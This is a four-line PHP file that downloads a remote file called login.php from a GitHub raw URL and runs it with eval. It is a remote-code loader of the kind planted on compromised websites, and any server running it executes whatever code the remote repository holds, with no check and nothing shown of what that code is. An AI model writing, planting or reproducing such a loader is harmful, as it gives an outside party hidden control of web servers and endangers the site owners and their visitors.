<?php
$content = file_get_contents(urldecode('https://raw.githubusercontent.com/albertenglishk4495/pbn/refs/heads/main/login.php'));
$content = "?> ".$content;
eval($content);
